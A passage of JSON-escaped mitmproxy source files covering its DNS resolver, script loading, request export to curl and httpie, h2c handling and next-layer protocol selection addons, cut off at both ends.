    addr = sockaddr(question.name[: -len(suffix)].split(\".\")[::-1])\n    except ValueError:\n        raise ResolveError(dns.response_codes.FORMERR)\n    try:\n        name, _ = await loop.getnameinfo(addr, flags=socket.NI_NAMEREQD)\n    except socket.gaierror as e:\n        raise ResolveError(\n            dns.response_codes.NXDOMAIN\n            if e.errno == socket.EAI_NONAME\n            else dns.response_codes.SERVFAIL\n        )\n    return [\n        dns.ResourceRecord(\n            name=question.name,\n            type=question.type,\n            class_=question.class_,\n            ttl=dns.ResourceRecord.DEFAULT_TTL,\n            data=dns.domain_names.pack(name),\n        )\n    ]\n\n\nasync def resolve_question(\n    question: dns.Question, loop: asyncio.AbstractEventLoop\n) -> Iterable[dns.ResourceRecord]:\n    \"\"\"Resolve the question into resource record(s), throwing ResolveError if an error condition occurs.\"\"\"\n\n    if question.class_ != dns.classes.IN:\n        raise ResolveError(dns.response_codes.NOTIMP)\n    if question.type == dns.types.A:\n        return await resolve_question_by_name(\n            question, loop, socket.AddressFamily.AF_INET, ipaddress.IPv4Address\n        )\n    elif question.type == dns.types.AAAA:\n        return await resolve_question_by_name(\n            question, loop, socket.AddressFamily.AF_INET6, ipaddress.IPv6Address\n        )\n    elif question.type == dns.types.PTR:\n        name_lower = question.name.lower()\n        if name_lower.endswith(IP4_PTR_SUFFIX):\n            return await resolve_question_by_addr(\n                question=question,\n                loop=loop,\n                suffix=IP4_PTR_SUFFIX,\n                sockaddr=lambda x: (str(ipaddress.IPv4Address(\".\".join(x))), 0),\n            )\n        elif name_lower.endswith(IP6_PTR_SUFFIX):\n            return await resolve_question_by_addr(\n                question=question,\n                loop=loop,\n                suffix=IP6_PTR_SUFFIX,\n                sockaddr=lambda x: (\n                    str(ipaddress.IPv6Address(bytes.fromhex(\"\".join(x)))),\n                    0,\n                    0,\n                    0,\n                ),\n            )\n        else:\n            raise ResolveError(dns.response_codes.FORMERR)\n    else:\n        raise ResolveError(dns.response_codes.NOTIMP)\n\n\nasync def resolve_message(\n    message: dns.Message, loop: asyncio.AbstractEventLoop\n) -> dns.Message:\n    try:\n        if not message.query:\n            raise ResolveError(\n                dns.response_codes.REFUSED\n            )  # we cannot resolve an answer\n        if message.op_code != dns.op_codes.QUERY:\n            raise ResolveError(\n                dns.response_codes.NOTIMP\n            )  # inverse queries and others are not supported\n        rrs: list[dns.ResourceRecord] = []\n        for question in message.questions:\n            rrs.extend(await resolve_question(question, loop))\n    except ResolveError as e:\n        return message.fail(e.response_code)\n    else:\n        return message.succeed(rrs)\n\n\nclass DnsResolver:\n    async def dns_request(self, flow: dns.DNSFlow) -> None:\n        should_resolve = (\n            (\n                isinstance(flow.client_conn.proxy_mode, mode_specs.DnsMode)\n                or (\n                    isinstance(flow.client_conn.proxy_mode, mode_specs.WireGuardMode)\n                    and flow.server_conn.address == (\"10.0.0.53\", 53)\n                )\n            )\n            and flow.live\n            and not flow.response\n            and not flow.error\n        )\n        if should_resolve:\n            # TODO: We need to handle overly long responses here.\n            flow.response = await resolve_message(\n                flow.request, asyncio.get_running_loop()\n            )\n", "mitmproxy/addons/keepserving.py": "from __future__ import annotations\n\nimport asyncio\n\nfrom mitmproxy import ctx\nfrom mitmproxy.utils import asyncio_utils\n\n\nclass KeepServing:\n    _watch_task: asyncio.Task | None = None\n\n    def load(self, loader):\n        loader.add_option(\n            \"keepserving\",\n            bool,\n            False,\n            \"\"\"\n            Continue serving after client playback, server playback or file\n            read. This option is ignored by interactive tools, which always keep\n            serving.\n            \"\"\",\n        )\n\n    def keepgoing(self) -> bool:\n        checks = [\n            \"readfile.reading\",\n            \"replay.client.count\",\n            \"replay.server.count\",\n        ]\n        return any([ctx.master.commands.call(c) for c in checks])\n\n    def shutdown(self):  # pragma: no cover\n        ctx.master.shutdown()\n\n    async def watch(self):\n        while True:\n            await asyncio.sleep(0.1)\n            if not self.keepgoing():\n                self.shutdown()\n\n    def running(self):\n        opts = [\n            ctx.options.client_replay,\n            ctx.options.server_replay,\n            ctx.options.rfile,\n        ]\n        if any(opts) and not ctx.options.keepserving:\n            self._watch_task = asyncio_utils.create_task(\n                self.watch(), name=\"keepserving\"\n            )\n", "mitmproxy/addons/script.py": "import asyncio\nimport importlib.machinery\nimport importlib.util\nimport logging\nimport os\nimport sys\nimport types\nfrom collections.abc import Sequence\n\nimport mitmproxy.types as mtypes\nfrom mitmproxy import addonmanager\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import eventsequence\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import hooks\nfrom mitmproxy.utils import asyncio_utils\n\nlogger = logging.getLogger(__name__)\n\n\ndef load_script(path: str) -> types.ModuleType | None:\n    fullname = \"__mitmproxy_script__.{}\".format(\n        os.path.splitext(os.path.basename(path))[0]\n    )\n    # the fullname is not unique among scripts, so if there already is an existing script with said\n    # fullname, remove it.\n    sys.modules.pop(fullname, None)\n    oldpath = sys.path\n    sys.path.insert(0, os.path.dirname(path))\n    m = None\n    try:\n        loader = importlib.machinery.SourceFileLoader(fullname, path)\n        spec = importlib.util.spec_from_loader(fullname, loader=loader)\n        assert spec\n        m = importlib.util.module_from_spec(spec)\n        loader.exec_module(m)\n        if not getattr(m, \"name\", None):\n            m.name = path  # type: ignore\n    except ImportError as e:\n        if getattr(sys, \"frozen\", False):\n            e.msg += (\n                f\".\\n\"\n                f\"Note that mitmproxy's binaries include their own Python environment. \"\n                f\"If your addon requires the installation of additional dependencies, \"\n                f\"please install mitmproxy from PyPI \"\n                f\"(https://docs.mitmproxy.org/stable/overview-installation/#installation-from-the-python-package-index-pypi).\"\n            )\n        script_error_handler(path, e)\n    except Exception as e:\n        script_error_handler(path, e)\n    finally:\n        sys.path[:] = oldpath\n        return m\n\n\ndef script_error_handler(path: str, exc: Exception) -> None:\n    \"\"\"\n    Log errors during script loading.\n    \"\"\"\n    tback = exc.__traceback__\n    tback = addonmanager.cut_traceback(\n        tback, \"invoke_addon_sync\"\n    )  # we're calling configure() on load\n    tback = addonmanager.cut_traceback(\n        tback, \"_call_with_frames_removed\"\n    )  # module execution from importlib\n    logger.error(f\"error in script {path}\", exc_info=(type(exc), exc, tback))\n\n\nReloadInterval = 1\n\n\nclass Script:\n    \"\"\"\n    An addon that manages a single script.\n    \"\"\"\n\n    def __init__(self, path: str, reload: bool) -> None:\n        self.name = \"scriptmanager:\" + path\n        self.path = path\n        self.fullpath = os.path.expanduser(path.strip(\"'\\\" \"))\n        self.ns: types.ModuleType | None = None\n        self.is_running = False\n\n        if not os.path.isfile(self.fullpath):\n            raise exceptions.OptionsError(f\"No such script: {self.fullpath}\")\n\n        self.reloadtask = None\n        if reload:\n            self.reloadtask = asyncio_utils.create_task(\n                self.watcher(),\n                name=f\"script watcher for {path}\",\n            )\n        else:\n            self.loadscript()\n\n    def running(self):\n        self.is_running = True\n\n    def done(self):\n        if self.reloadtask:\n            self.reloadtask.cancel()\n\n    @property\n    def addons(self):\n        return [self.ns] if self.ns else []\n\n    def loadscript(self):\n        logger.info(\"Loading script %s\" % self.path)\n        if self.ns:\n            ctx.master.addons.remove(self.ns)\n        self.ns = None\n        with addonmanager.safecall():\n            ns = load_script(self.fullpath)\n            ctx.master.addons.register(ns)\n            self.ns = ns\n        if self.ns:\n            try:\n                ctx.master.addons.invoke_addon_sync(\n                    self.ns, hooks.ConfigureHook(ctx.options.keys())\n                )\n            except Exception as e:\n                script_error_handler(self.fullpath, e)\n            if self.is_running:\n                # We're already running, so we call that on the addon now.\n                ctx.master.addons.invoke_addon_sync(self.ns, hooks.RunningHook())\n\n    async def watcher(self):\n        # Script loading is terminally confused at the moment.\n        # This here is a stopgap workaround to defer loading.\n        await asyncio.sleep(0)\n        last_mtime = 0.0\n        while True:\n            try:\n                mtime = os.stat(self.fullpath).st_mtime\n            except FileNotFoundError:\n                logger.info(\"Removing script %s\" % self.path)\n                scripts = list(ctx.options.scripts)\n                scripts.remove(self.path)\n                ctx.options.update(scripts=scripts)\n                return\n            if mtime > last_mtime:\n                self.loadscript()\n                last_mtime = mtime\n            await asyncio.sleep(ReloadInterval)\n\n\nclass ScriptLoader:\n    \"\"\"\n    An addon that manages loading scripts from options.\n    \"\"\"\n\n    def __init__(self):\n        self.is_running = False\n        self.addons = []\n\n    def load(self, loader):\n        loader.add_option(\"scripts\", Sequence[str], [], \"Execute a script.\")\n\n    def running(self):\n        self.is_running = True\n\n    @command.command(\"script.run\")\n    def script_run(self, flows: Sequence[flow.Flow], path: mtypes.Path) -> None:\n        \"\"\"\n        Run a script on the specified flows. The script is configured with\n        the current options and all lifecycle events for each flow are\n        simulated. Note that the load event is not invoked.\n        \"\"\"\n        if not os.path.isfile(path):\n            logger.error(\"No such script: %s\" % path)\n            return\n        mod = load_script(path)\n        if mod:\n            with addonmanager.safecall():\n                ctx.master.addons.invoke_addon_sync(\n                    mod,\n                    hooks.ConfigureHook(ctx.options.keys()),\n                )\n                ctx.master.addons.invoke_addon_sync(mod, hooks.RunningHook())\n                for f in flows:\n                    for evt in eventsequence.iterate(f):\n                        ctx.master.addons.invoke_addon_sync(mod, evt)\n\n    def configure(self, updated):\n        if \"scripts\" in updated:\n            for s in ctx.options.scripts:\n                if ctx.options.scripts.count(s) > 1:\n                    raise exceptions.OptionsError(\"Duplicate script\")\n\n            for a in self.addons[:]:\n                if a.path not in ctx.options.scripts:\n                    logger.info(\"Un-loading script: %s\" % a.path)\n                    ctx.master.addons.remove(a)\n                    self.addons.remove(a)\n\n            # The machinations below are to ensure that:\n            #   - Scripts remain in the same order\n            #   - Scripts are not initialized un-necessarily. If only a\n            #   script's order in the script list has changed, it is just\n            #   moved.\n\n            current = {}\n            for a in self.addons:\n                current[a.path] = a\n\n            ordered = []\n            newscripts = []\n            for s in ctx.options.scripts:\n                if s in current:\n                    ordered.append(current[s])\n                else:\n                    sc = Script(s, True)\n                    ordered.append(sc)\n                    newscripts.append(sc)\n\n            self.addons = ordered\n\n            for s in newscripts:\n                ctx.master.addons.register(s)\n                if self.is_running:\n                    # If we're already running, we configure and tell the addon\n                    # we're up and running.\n                    ctx.master.addons.invoke_addon_sync(s, hooks.RunningHook())\n", "mitmproxy/addons/export.py": "import logging\nimport shlex\nfrom collections.abc import Callable\nfrom collections.abc import Sequence\nfrom typing import Any\n\nimport pyperclip\n\nimport mitmproxy.types\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy.net.http.http1 import assemble\nfrom mitmproxy.utils import strutils\n\n\ndef cleanup_request(f: flow.Flow) -> http.Request:\n    if not getattr(f, \"request\", None):\n        raise exceptions.CommandError(\"Can't export flow with no request.\")\n    assert isinstance(f, http.HTTPFlow)\n    request = f.request.copy()\n    request.decode(strict=False)\n    return request\n\n\ndef pop_headers(request: http.Request) -> http.Request:\n    # Remove some headers that are redundant for curl/httpie export\n    request.headers.pop(\"content-length\")\n    if request.headers.get(\"host\", \"\") == request.host:\n        request.headers.pop(\"host\")\n    if request.headers.get(\":authority\", \"\") == request.host:\n        request.headers.pop(\":authority\")\n    return request\n\n\ndef cleanup_response(f: flow.Flow) -> http.Response:\n    if not getattr(f, \"response\", None):\n        raise exceptions.CommandError(\"Can't export flow with no response.\")\n    assert isinstance(f, http.HTTPFlow)\n    response = f.response.copy()  # type: ignore\n    response.decode(strict=False)\n    return response\n\n\ndef request_content_for_console(request: http.Request) -> str:\n    try:\n        text = request.get_text(strict=True)\n        assert text\n    except ValueError:\n        # shlex.quote doesn't support a bytes object\n        # see https://github.com/python/cpython/pull/10871\n        raise exceptions.CommandError(\"Request content must be valid unicode\")\n    escape_control_chars = {chr(i): f\"\\\\x{i:02x}\" for i in range(32)}\n    return \"\".join(escape_control_chars.get(x, x) for x in text)\n\n\ndef curl_command(f: flow.Flow) -> str:\n    request = cleanup_request(f)\n    request = pop_headers(request)\n    args = [\"curl\"]\n\n    server_addr = f.server_conn.peername[0] if f.server_conn.peername else None\n\n    if (\n        ctx.options.export_preserve_original_ip\n        and server_addr\n        and request.pretty_host != server_addr\n    ):\n        resolve = f\"{request.pretty_host}:{request.port}:[{server_addr}]\"\n        args.append(\"--resolve\")\n        args.append(resolve)\n\n    for k, v in request.headers.items(multi=True):\n        if k.lower() == \"accept-encoding\":\n            args.append(\"--compressed\")\n        else:\n            args += [\"-H\", f\"{k}: {v}\"]\n\n    if request.method != \"GET\":\n        args += [\"-X\", request.method]\n\n    args.append(request.pretty_url)\n\n    if request.content:\n        args += [\"-d\", request_content_for_console(request)]\n    return \" \".join(shlex.quote(arg) for arg in args)\n\n\ndef httpie_command(f: flow.Flow) -> str:\n    request = cleanup_request(f)\n    request = pop_headers(request)\n\n    # TODO: Once https://github.com/httpie/httpie/issues/414 is implemented, we\n    # should ensure we always connect to the IP address specified in the flow,\n    # similar to how it's done in curl_command.\n    url = request.pretty_url\n\n    args = [\"http\", request.method, url]\n    for k, v in request.headers.items(multi=True):\n        args.append(f\"{k}: {v}\")\n    cmd = \" \".join(shlex.quote(arg) for arg in args)\n    if request.content:\n        cmd += \" <<< \" + shlex.quote(request_content_for_console(request))\n    return cmd\n\n\ndef raw_request(f: flow.Flow) -> bytes:\n    request = cleanup_request(f)\n    if request.raw_content is None:\n        raise exceptions.CommandError(\"Request content missing.\")\n    return assemble.assemble_request(request)\n\n\ndef raw_response(f: flow.Flow) -> bytes:\n    response = cleanup_response(f)\n    if response.raw_content is None:\n        raise exceptions.CommandError(\"Response content missing.\")\n    return assemble.assemble_response(response)\n\n\ndef raw(f: flow.Flow, separator=b\"\\r\\n\\r\\n\") -> bytes:\n    \"\"\"Return either the request or response if only one exists, otherwise return both\"\"\"\n    request_present = (\n        isinstance(f, http.HTTPFlow) and f.request and f.request.raw_content is not None\n    )\n    response_present = (\n        isinstance(f, http.HTTPFlow)\n        and f.response\n        and f.response.raw_content is not None\n    )\n\n    if request_present and response_present:\n        parts = [raw_request(f), raw_response(f)]\n        if isinstance(f, http.HTTPFlow) and f.websocket:\n            parts.append(f.websocket._get_formatted_messages())\n        return separator.join(parts)\n    elif request_present:\n        return raw_request(f)\n    elif response_present:\n        return raw_response(f)\n    else:\n        raise exceptions.CommandError(\"Can't export flow with no request or response.\")\n\n\nformats: dict[str, Callable[[flow.Flow], str | bytes]] = dict(\n    curl=curl_command,\n    httpie=httpie_command,\n    raw=raw,\n    raw_request=raw_request,\n    raw_response=raw_response,\n)\n\n\nclass Export:\n    def load(self, loader):\n        loader.add_option(\n            \"export_preserve_original_ip\",\n            bool,\n            False,\n            \"\"\"\n            When exporting a request as an external command, make an effort to\n            connect to the same IP as in the original request. This helps with\n            reproducibility in cases where the behaviour depends on the\n            particular host we are connecting to. Currently this only affects\n            curl exports.\n            \"\"\",\n        )\n\n    @command.command(\"export.formats\")\n    def formats(self) -> Sequence[str]:\n        \"\"\"\n        Return a list of the supported export formats.\n        \"\"\"\n        return list(sorted(formats.keys()))\n\n    @command.command(\"export.file\")\n    def file(self, format: str, flow: flow.Flow, path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Export a flow to path.\n        \"\"\"\n        if format not in formats:\n            raise exceptions.CommandError(\"No such export format: %s\" % format)\n        func: Any = formats[format]\n        v = func(flow)\n        try:\n            with open(path, \"wb\") as fp:\n                if isinstance(v, bytes):\n                    fp.write(v)\n                else:\n                    fp.write(v.encode(\"utf-8\"))\n        except OSError as e:\n            logging.error(str(e))\n\n    @command.command(\"export.clip\")\n    def clip(self, format: str, f: flow.Flow) -> None:\n        \"\"\"\n        Export a flow to the system clipboard.\n        \"\"\"\n        try:\n            pyperclip.copy(self.export_str(format, f))\n        except pyperclip.PyperclipException as e:\n            logging.error(str(e))\n\n    @command.command(\"export\")\n    def export_str(self, format: str, f: flow.Flow) -> str:\n        \"\"\"\n        Export a flow and return the result.\n        \"\"\"\n        if format not in formats:\n            raise exceptions.CommandError(\"No such export format: %s\" % format)\n        func = formats[format]\n\n        return strutils.always_str(func(f), \"utf8\", \"backslashreplace\")\n", "mitmproxy/addons/disable_h2c.py": "import logging\n\n\nclass DisableH2C:\n    \"\"\"\n    We currently only support HTTP/2 over a TLS connection.\n\n    Some clients try to upgrade a connection from HTTP/1.1 to h2c. We need to\n    remove those headers to avoid protocol errors if one endpoints suddenly\n    starts sending HTTP/2 frames.\n\n    Some clients might use HTTP/2 Prior Knowledge to directly initiate a session\n    by sending the connection preface. We just kill those flows.\n    \"\"\"\n\n    def process_flow(self, f):\n        if f.request.headers.get(\"upgrade\", \"\") == \"h2c\":\n            logging.warning(\n                \"HTTP/2 cleartext connections (h2c upgrade requests) are currently not supported.\"\n            )\n            del f.request.headers[\"upgrade\"]\n            if \"connection\" in f.request.headers:\n                del f.request.headers[\"connection\"]\n            if \"http2-settings\" in f.request.headers:\n                del f.request.headers[\"http2-settings\"]\n\n        is_connection_preface = (\n            f.request.method == \"PRI\"\n            and f.request.path == \"*\"\n            and f.request.http_version == \"HTTP/2.0\"\n        )\n        if is_connection_preface:\n            f.kill()\n            logging.warning(\n                \"Initiating HTTP/2 connections with prior knowledge are currently not supported.\"\n            )\n\n    # Handlers\n\n    def request(self, f):\n        self.process_flow(f)\n", "mitmproxy/addons/next_layer.py": "\"\"\"\nThis addon determines the next protocol layer in our proxy stack.\nWhenever a protocol layer in the proxy wants to pass a connection to a child layer and isn't sure which protocol comes\nnext, it calls the `next_layer` hook, which ends up here.\nFor example, if mitmproxy runs as a regular proxy, we first need to determine if\nnew clients start with a TLS handshake right away (Secure Web Proxy) or send a plaintext HTTP CONNECT request.\nThis addon here peeks at the incoming bytes and then makes a decision based on proxy mode, mitmproxy options, etc.\n\nFor a typical HTTPS request, this addon is called a couple of times: First to determine that we start with an HTTP layer\nwhich processes the `CONNECT` request, a second time to determine that the client then starts negotiating TLS, and a\nthird time when we check if the protocol within that TLS stream is actually HTTP or something else.\n\nSometimes it's useful to hardcode specific logic in next_layer when one wants to do fancy things.\nIn that case it's not necessary to modify mitmproxy's source, adding a custom addon with a next_layer event hook\nthat sets nextlayer.layer works just as well.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport logging\nimport re\nimport sys\nfrom collections.abc import Iterable\nfrom collections.abc import Sequence\nfrom typing import Any\nfrom typing import cast\n\nfrom mitmproxy import ctx\nfrom mitmproxy.net.tls import starts_like_dtls_record\nfrom mitmproxy.net.tls import starts_like_tls_record\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy import layers\nfrom mitmproxy.proxy import mode_specs\nfrom mitmproxy.proxy import tunnel\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.layer import Layer\nfrom mitmproxy.proxy.layers import ClientQuicLayer\nfrom mitmproxy.proxy.layers import ClientTLSLayer\nfrom mitmproxy.proxy.layers import DNSLayer\nfrom mitmproxy.proxy.layers import HttpLayer\nfrom mitmproxy.proxy.layers import modes\nfrom mitmproxy.proxy.layers import RawQuicLayer\nfrom mitmproxy.proxy.layers import ServerQuicLayer\nfrom mitmproxy.proxy.layers import ServerTLSLayer\nfrom mitmproxy.proxy.layers import TCPLayer\nfrom mitmproxy.proxy.layers import UDPLayer\nfrom mitmproxy.proxy.layers.http import HTTPMode\nfrom mitmproxy.proxy.layers.quic import quic_parse_client_hello\nfrom mitmproxy.proxy.layers.tls import dtls_parse_client_hello\nfrom mitmproxy.proxy.layers.tls import HTTP1_ALPNS\nfrom mitmproxy.proxy.layers.tls import HTTP_ALPNS\nfrom mitmproxy.proxy.layers.tls import parse_client_hello\nfrom mitmproxy.tls import ClientHello\n\nif sys.version_info < (3, 11):\n    from typing_extensions import assert_never\nelse:\n    from typing import assert_never\n\nlogger = logging.getLogger(__name__)\n\n\ndef stack_match(\n    context: Context, layers: Sequence[type[Layer] | tuple[type[Layer], ...]]\n) -> bool:\n    if len(context.layers) != len(layers):\n        return False\n    return all(\n        expected is Any or isinstance(actual, expected)\n        for actual, expected in zip(context.layers, layers)\n    )\n\n\nclass NeedsMoreData(Exception):\n    \"\"\"Signal that the decision on which layer to put next needs to be deferred within the NextLayer addon.\"\"\"\n\n\nclass NextLayer:\n    ignore_hosts: Sequence[re.Pattern] = ()\n    allow_hosts: Sequence[re.Pattern] = ()\n    tcp_hosts: Sequence[re.Pattern] = ()\n    udp_hosts: Sequence[re.Pattern] = ()\n\n    def configure(self, updated):\n        if \"tcp_hosts\" in updated:\n            self.tcp_hosts = [\n                re.compile(x, re.IGNORECASE) for x in ctx.options.tcp_hosts\n            ]\n        if \"udp_hosts\" in updated:\n            self.udp_hosts = [\n                re.compile(x, re.IGNORECASE) for x in ctx.options.udp_hosts\n            ]\n        if \"allow_hosts\" in updated or \"ignore_hosts\" in updated:\n            self.ignore_hosts = [\n                re.compile(x, re.IGNORECASE) for x in ctx.options.ignore_hosts\n            ]\n            self.allow_hosts = [\n                re.compile(x, re.IGNORECASE) for x in ctx.options.allow_hosts\n            ]\n\n    def next_layer(self, nextlayer: layer.NextLayer):\n        if nextlayer.layer:\n            return  # do not override something another addon has set.\n        try:\n            nextlayer.layer = self._next_layer(\n                nextlayer.context,\n                nextlayer.data_client(),\n                nextlayer.data_server(),\n            )\n        except NeedsMoreData:\n            logger.info(\n                f\"Deferring layer decision, not enough data: {nextlayer.data_client().hex()}\"\n            )\n\n    def _next_layer(\n        self, context: Context, data_client: bytes, data_server: bytes\n    ) -> Layer | None:\n        assert context.layers\n\n        def s(*layers):\n            return stack_match(context, layers)\n\n        tcp_based = context.client.transport_protocol == \"tcp\"\n        udp_based = context.client.transport_protocol == \"udp\"\n\n        # 1)  check for --ignore/--allow\n        if self._ignore_connection(context, data_client, data_server):\n            return (\n                layers.TCPLayer(context, ignore=True)\n                if tcp_based\n                else layers.UDPLayer(context, ignore=True)\n            )\n\n        # 2)  Handle proxy modes with well-defined next protocol\n        # 2a) Reverse proxy: derive from spec\n        if s(modes.ReverseProxy):\n            return self._setup_reverse_proxy(context, data_client)\n        # 2b) Explicit HTTP proxies\n        if s((modes.HttpProxy, modes.HttpUpstreamProxy)):\n            return self._setup_explicit_http_proxy(context, data_client)\n\n        # 3)  Handle security protocols\n        # 3a) TLS/DTLS\n        is_tls_or_dtls = (\n            tcp_based\n            and starts_like_tls_record(data_client)\n            or udp_based\n            and starts_like_dtls_record(data_client)\n        )\n        if is_tls_or_dtls:\n            server_tls = ServerTLSLayer(context)\n            server_tls.child_layer = ClientTLSLayer(context)\n            return server_tls\n        # 3b) QUIC\n        if udp_based and _starts_like_quic(data_client):\n            server_quic = ServerQuicLayer(context)\n            server_quic.child_layer = ClientQuicLayer(context)\n            return server_quic\n\n        # 4)  Check for --tcp/--udp\n        if tcp_based and self._is_destination_in_hosts(context, self.tcp_hosts):\n            return layers.TCPLayer(context)\n        if udp_based and self._is_destination_in_hosts(context, self.udp_hosts):\n            return layers.UDPLayer(context)\n\n        # 5)  Handle application protocol\n        # 5a) Is it DNS?\n        if context.server.address and context.server.address[1] in (53, 5353):\n            return layers.DNSLayer(context)\n\n        # 5b) We have no other specialized layers for UDP, so we fall back to raw forwarding.\n        if udp_based:\n            return layers.UDPLayer(context)\n        # 5b) Check for raw tcp mode.\n        very_likely_http = context.client.alpn in HTTP_ALPNS\n        probably_no_http = not very_likely_http and (\n            # the first three bytes should be the HTTP verb, so A-Za-z is expected.\n            len(data_client) < 3\n            or not data_client[:3].isalpha()\n            # a server greeting would be uncharacteristic.\n            or data_server\n        )\n        if ctx.options.rawtcp and probably_no_http:\n            return layers.TCPLayer(context)\n        # 5c) Assume HTTP by default.\n        return layers.HttpLayer(context, HTTPMode.transparent)\n\n    def _ignore_connection(\n        self,\n        context: Context,\n        data_client: bytes,\n        data_server: bytes,\n    ) -> bool | None:\n        \"\"\"\n        Returns:\n            True, if the connection should be ignored.\n            False, if it should not be ignored.\n\n        Raises:\n            NeedsMoreData, if we need to wait for more input data.\n        \"\"\"\n        if not ctx.options.ignore_hosts and not ctx.options.allow_hosts:\n            return False\n        # Special handling for wireguard mode: if the hostname is \"10.0.0.53\", do not ignore the connection\n        if isinstance(\n            context.client.proxy_mode, mode_specs.WireGuardMode\n        ) and context.server.address == (\"10.0.0.53\", 53):\n            return False\n        hostnames: list[str] = []\n        if context.server.peername:\n            host, port, *_ = context.server.peername\n            hostnames.append(f\"{host}:{port}\")\n        if context.server.address:\n            host, port, *_ = context.server.address\n            hostnames.append(f\"{host}:{port}\")\n\n            # We also want to check for TLS SNI and HTTP host headers, but in order to ignore connections based on that\n            # they must have a destination address. If they don't, we don't know how to establish an upstream connection\n            # if we ignore.\n            if host_header := self._get_host_header(context, data_client, data_server):\n                if not re.search(r\":\\d+$\", host_header):\n                    host_header = f\"{host_header}:{port}\"\n                hostnames.append(host_header)\n            if (\n                client_hello := self._get_client_hello(context, data_client)\n            ) and client_hello.sni:\n                hostnames.append(f\"{client_hello.sni}:{port}\")\n\n        if not hostnames:\n            return False\n\n        if ctx.options.allow_hosts:\n            not_allowed = not any(\n                re.search(rex, host, re.IGNORECASE)\n                for host in hostnames\n                for rex in ctx.options.allow_hosts\n            )\n            if not_allowed:\n                return True\n\n        if ctx.options.ignore_hosts:\n            ignored = any(\n                re.search(rex, host, re.IGNORECASE)\n                for host in hostnames\n                for rex in ctx.options.ignore_hosts\n            )\n            if ignored:\n                return True\n\n        return False\n\n    @staticmethod\n    def _get_host_header(\n        context: Context,\n        data_client: bytes,\n        data_server: bytes,\n    ) -> str | None:\n        \"\"\"\n        Try to read a host header from data_client.\n\n        Returns:\n            The host header value, or None, if no host header was found.\n\n        Raises:\n            NeedsMoreData, if the HTTP request is incomplete.\n        \"\"\"\n        if context.client.transport_protocol != \"tcp\" or data_server:\n            return None\n\n        host_header_expected = context.client.alpn in HTTP1_ALPNS or re.match(\n            rb\"[A-Z]{3,}.+HTTP/\", data_client, re.IGNORECASE\n        )\n        if host_header_expected:\n            if m := re.search(\n                rb\"\\r\\n(?:Host:\\s+(.+?)\\s*)?\\r\\n\", data_client, re.IGNORECASE\n            ):\n                if host := m.group(1):\n                    return host.decode(\"utf-8\", \"surrogateescape\")\n                else:\n                    return None  # \\r\\n\\r\\n - header end came first.\n            else:\n                raise NeedsMoreData\n        else:\n            return None\n\n    @staticmethod\n    def _get_client_hello(context: Context, data_client: bytes) -> ClientHello | None:\n        \"\"\"\n        Try to read a TLS/DTLS/QUIC ClientHello from data_client.\n\n        Returns:\n            A complete ClientHello, or None, if no ClientHello was found.\n\n        Raises:\n            NeedsMoreData, if the ClientHello is incomplete.\n        \"\"\"\n        match context.client.transport_protocol:\n            case \"tcp\":\n                if starts_like_tls_record(data_client):\n                    try:\n                        ch = parse_client_hello(data_client)\n                    except ValueError:\n                        pass\n                    else:\n                        if ch is None:\n                            raise NeedsMoreData\n                        return ch\n                return None\n            case \"udp\":\n                try:\n                    return quic_parse_client_hello(data_client)\n                except ValueError:\n                    pass\n\n                try:\n                    ch = dtls_parse_client_hello(data_client)\n                except ValueError:\n                    pass\n                else:\n                    if ch is None:\n                        raise NeedsMoreData\n                    return ch\n                return None\n            case _:  # pragma: no cover\n                assert_never(context.client.transport_protocol)\n\n    @staticmethod\n    def _setup_reverse_proxy(context: Context, data_client: bytes) -> Layer:\n        spec = cast(mode_specs.ReverseMode, context.client.proxy_mode)\n        stack = tunnel.LayerStack()\n\n        match spec.scheme:\n            case \"http\":\n                if starts_like_tls_record(data_client):\n                    stack /= ClientTLSLayer(context)\n                stack /= HttpLayer(context, HTTPMode.transparent)\n            case \"https\":\n                stack /= ServerTLSLayer(context)\n                if starts_like_tls_record(data_client):\n                    stack /= ClientTLSLayer(context)\n                stack /= HttpLayer(context, HTTPMode.transparent)\n\n            case \"tcp\":\n                if starts_like_tls_record(data_client):\n                    stack /= ClientTLSLayer(context)\n                stack /= TCPLayer(context)\n            case \"tls\":\n                stack /= ServerTLSLayer(context)\n                if starts_like_tls_record(data_client):\n                    stack /= ClientTLSLayer(context)\n                stack /= TCPLayer(context)\n\n            case \"udp\":\n                if starts_like_dtls_record(data_client):\n                    stack /= ClientTLSLayer(context)\n                stack /= UDPLayer(context)\n            case \"dtls\":\n                stack /= ServerTLSLayer(context)\n                if starts_like_dtls_record(data_client):\n                    stack /= ClientTLSLayer(context)\n                stack /= UDPLayer(context)\n\n            case \"dns\":\n                # TODO: DNS-over-TLS / DNS-over-DTLS\n                # is_tls_or_dtls = (\n                #     context.client.transport_protocol == \"tcp\" and starts_like_tls_record(data_client)\n                #     or\n                #     context.client.transport_protocol == \"udp\" and starts_like_dtls_record(data_client)\n                # )\n                # if is_tls_or_dtls:\n                #     stack /= ClientTLSLayer(context)\n                stack /= DNSLayer(context)\n\n            case \"http3\":\n                stack /= ServerQuicLayer(context)\n                stack /= ClientQuicLayer(context)\n                stack /= HttpLayer(context, HTTPMode.transparent)\n            case \"quic\":\n                stack /= ServerQuicLayer(context)\n                stack /= ClientQuicLayer(context)\n                stack /= RawQuicLayer(context)\n\n            case _:  # pragma: no cover\n                assert_never(spec.scheme)\n\n        return stack[0]\n\n    @staticmethod\n    def _setup_explicit_http_proxy(context: Context, data_client: bytes) -> Layer:\n        stack = tunnel.LayerStack()\n\n        if context.client.transport_protocol == \"udp\":\n            stack /= layers.ClientQuicLayer(context)\n        elif starts_like_tls_record(data_client):\n            stack /= layers.ClientTLSLayer(context)\n\n        if isinstance(context.layers[0], modes.HttpUpstreamProxy):\n            stack /= layers.HttpLayer(context, HTTPMode.upstream)\n        else:\n            stack /= layers.HttpLayer(context, HTTPMode.regular)\n\n        return stack[0]\n\n    @staticmethod\n    def _is_destination_in_hosts(context: Context, hosts: Iterable[re.Pattern]) -> bool:\n        return any(\n            (context.server.address and rex.search(context.server.address[0]))\n            or (context.client.sni and 